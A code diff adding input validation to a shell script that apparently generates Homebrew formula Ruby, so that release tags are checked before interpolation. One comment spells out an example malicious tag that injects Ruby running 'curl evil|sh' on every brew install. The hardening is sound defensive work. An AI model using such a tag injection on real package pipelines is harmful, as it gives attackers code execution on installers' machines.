@@ -215,6 +215,38 @@ render_product() { # $1=table entry
 	}
 	version="${tag#v}"
 
+	# The tag is the only field here that comes from outside this repository and
+	# carries no signature of its own. SHA256SUMS is verified, and the digests it
+	# gives are checked to be 64 hex characters before use -- but the tag travels
+	# beside that signature, not inside it, and it lands in an UNQUOTED heredoc
+	# that generates Ruby.
+	#
+	# A tag of the form
+	#
+	#     v1.0.0"\n  def self.x; system("curl evil|sh"); end\n  version "1.0.0
+	#
+	# closes the version string and appends Ruby that runs on every
+	# `brew install`. Whoever can publish a release in a product repository would
+	# get code execution on every machine installing from this tap.
+	#
+	# So the version is held to the same standard as the digest: a fixed
+	# character set, checked before it is interpolated. Real tags are v5.1.0,
+	# v3.7.1 -- digits, dots, and the pre-release and build punctuation semver
+	# allows. Nothing else.
+	case "$version" in
+		"" | *[!0-9A-Za-z.+-]* | .* | *.)
+			echo "::error::$repo: the release tag \"$tag\" is not a plain version; refusing to interpolate it into generated code" >&2
+			return 1
+			;;
+	esac
+	case "$version" in
+		[0-9]*) ;;
+		*)
+			echo "::error::$repo: the release tag \"$tag\" does not start with a digit after stripping a leading v" >&2
+			return 1
+			;;
+	esac
+
 	verify_sha256sums "$repo" "$tag" || {
 		echo "::error::$repo $tag: SHA256SUMS is missing or does not verify against the org release key"
 		return 1
